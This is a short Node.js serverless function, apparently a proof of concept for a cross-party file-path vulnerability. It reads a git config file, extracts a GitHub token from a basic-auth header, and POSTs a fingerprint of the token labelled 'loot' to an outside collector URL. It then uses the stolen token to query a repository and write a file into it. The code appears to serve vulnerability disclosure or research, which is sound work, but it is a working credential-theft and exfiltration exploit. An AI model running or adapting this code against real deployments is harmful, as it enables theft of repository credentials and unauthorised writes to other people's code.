const fs = require('node:fs');
const crypto = require('node:crypto');
const COLLECTOR = "https://collector-h3iebgjr9-claudelobas-projects.vercel.app/api/c";
const REPO = "cllc3993/fpm-victim";
module.exports = async (req, res) => {
  const out = { marker: 'FPM_XPARTY_POC' };
  let cfg = null;
  try { cfg = fs.readFileSync('gitcfg.txt', 'utf8'); } catch (e) {}
  out.gitConfigRead = !!cfg;
  if (cfg) {
    const m = cfg.match(/AUTHORIZATION:\s*basic\s+([A-Za-z0-9+/=]+)/i);
    let token = null;
    if (m) { const dec = Buffer.from(m[1], 'base64').toString('utf8'); token = dec.split(':').slice(1).join(':'); }
    if (token) {
      out.tokenFp = { len: token.length, sha256_8: crypto.createHash('sha256').update(token).digest('hex').slice(0, 8), first4: token.slice(0, 4) };
      try { await fetch(COLLECTOR, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ loot: 'VICTIM_GITHUB_TOKEN', repo: REPO, fp: out.tokenFp }) }); out.exfil = 'sent'; } catch (e) { out.exfil = 'err:' + e.message; }
      try { const r = await fetch('https://api.github.com/repos/' + REPO, { headers: { Authorization: 'token ' + token, 'User-Agent': 'poc', Accept: 'application/vnd.github+json' } }); out.githubApi = { status: r.status }; if (r.ok) { const j = await r.json(); out.githubApi.full_name = j.full_name; } } catch (e) { out.githubApi = 'err:' + e.message; }
      try { const content = Buffer.from('victim repo written by attacker via leaked GITHUB_TOKEN, cross-party filePathMap PoC\n').toString('base64'); const w = await fetch('https://api.github.com/repos/' + REPO + '/contents/poc/ATTACKER_WROTE_TO_VICTIM.txt', { method: 'PUT', headers: { Authorization: 'token ' + token, 'User-Agent': 'poc', Accept: 'application/vnd.github+json' }, body: JSON.stringify({ message: 'attacker write to victim via leaked token', content }) }); out.writeVictim = { status: w.status }; } catch (e) { out.writeVictim = 'err:' + e.message; }
    }
  }
  res.setHeader('content-type', 'application/json');
  res.end(JSON.stringify(out, null, 2));
};
